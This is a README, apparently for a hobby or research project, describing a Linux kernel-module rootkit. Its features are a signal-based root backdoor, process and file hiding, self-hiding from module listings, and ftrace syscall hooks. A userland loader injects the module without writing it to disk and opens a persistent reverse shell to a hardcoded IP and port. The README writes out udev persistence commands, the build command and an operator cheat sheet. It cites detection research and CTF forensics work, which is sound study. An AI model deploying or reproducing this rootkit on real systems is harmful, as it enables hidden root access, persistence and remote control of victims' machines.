# linux-root-kit

A simple Linux rootkit.
Hides itself :P.


# Setup

```default
vagrant init .
vagrant up
```
And then you can logging with `vagrant ssh`

# Source
  - [How to build a vagrantbox](https://medium.com/@detolaadeya/how-to-set-up-an-ubuntu-virtual-machine-using-virtualbox-and-vagrant-9f6fa98f3586)
  - [Blogpost linux-rootkits-explained-part-2-loadable-kernel-modules](https://www.wiz.io/blog/linux-rootkits-explained-part-2-loadable-kernel-modules)
  - [Github linux_kernel_hacking by xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques)
  - [Bento](https://github.com/chef/bento)
  - [USP](https://github.com/grahamhelton/USP)
  - [Kernel upgrade fixes](https://medium.com/@_._.._/mkdir-api-hook-a-pathway-to-an-lkm-rootkit-in-linux-ae5e3fa6d4b8)
  - [PID bruteforce](https://github.com/sandflysecurity/sandfly-processdecloak)
  - [The Hidden Threat: Analysis of Linux Rootkit Techniques and Limitations of Current Detection Tools](https://dl.acm.org/doi/10.1145/3688808)
  - [HTB Business CTF 2025 Challenge (Driver's Shadow)](https://github.com/hackthebox/business-ctf-2025/tree/master/forensics/Driver's%20Shadow)
  - [HTB Blog post(/how to create coredump on vm)](https://www.hackthebox.com/blog/how-to-create-linux-symbol-tables-volatility)
  - [Symbol Finder ](https://github.com/Abyss-W4tcher/volatility3-symbols/tree/master)

# Functions of the rootkit
  - Communication over syskill hook
  - Privesc Backdoor over `kill -64 1`
  - Hidden by modifying the double-linked list of modules (`/proc/modules`)
  - Hidden by removing the kobject (`/sys/module`)
  - Hiding of files and directories that have a prefix
  - Hiding of processes with a set PID (can be set with a syskill)

# Next steps
  - Port hidding
  - Better process hiding (pids can be bruteforced)
  - Other communication with device files instead of syskill hook
  - <del>Write a dropper or loader (not just a simple `/sbin/insmod /rkit.ko` on boot with udev rule)</del>

# Persistence

<del>
Add the rkit.ko and the `_rkit_launcher.sh` to `/`
```
echo 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/_rkit_launcher.sh &"' | sudo tee /etc/udev/rules.d/99-load-rootkit.rules
```
</del>

[The reason why this wouldn't work](https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/#rtfm-udev-restrictions)


--> no "at" binary


--> so... launch reverse shell from kernel with `shell rsh` and just load the kernel module with the udev rule:

```
echo 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/shell load"' | sudo tee /etc/udev/rules.d/99-load-rootkit.rules
```

```
gcc -static -O2 -o shell shell.c
```

# Cheat Sheet

  ```
sudo udevadm monitor --environment --udev
sudo udevadm trigger --action add --name random
insmod rkit
rmmod rkit
lsmod
ls /sys/module/rkit
cat /proc/modules
kill -l
pstree -cptl
sudo udevadm monitor --environment --udev
sudo udevadm trigger --action add --name random
xxd -i rkit.ko > test.txt
  ```

# Module Documentation

## rkit.c (Kernel Module)

The kernel module `rkit.c` provides the following features:

- **Root Backdoor:** Sending signal 64 to any process grants root privileges (via `set_root`).
- **PID Hiding:** Sending signal 63 to a process hides it by PID (process will not appear in directory listings).
- **File/Directory Hiding:** Any file or directory with the prefix `_rkit` is hidden from directory listings.
- **Self-Hiding:** The module removes itself from `/proc/modules` and `/sys/modules` for stealth.
- **Self-Unload:** Sending signal 62 to any process will unload the module cleanly.
- **Hooks:** Uses ftrace to hook `kill`, `getdents`, and `getdents64` syscalls for backdoor and hiding features.
- **Persistence:** On load, the module starts a usermode loader (`/shell rsh`) for reverse shell persistence.

## shell.c (Userland Loader)

The userland binary `shell.c` provides two main functions:

- **Module Loader:** `shell load` loads the embedded kernel module into memory using the `init_module` syscall. No `.ko` file is written to disk.
- **Reverse Shell:** `shell rsh` daemonizes, hides itself, and connects back to a hardcoded IP/port (`192.168.56.101:9001`) for a persistent reverse shell. All activity is logged to `/var/log/volnaya.log`.
- **Persistence:** Designed to be triggered by a udev rule on boot for automatic module injection and remote access.

# Credits
  - [xcellerator](https://github.com/xcellerator)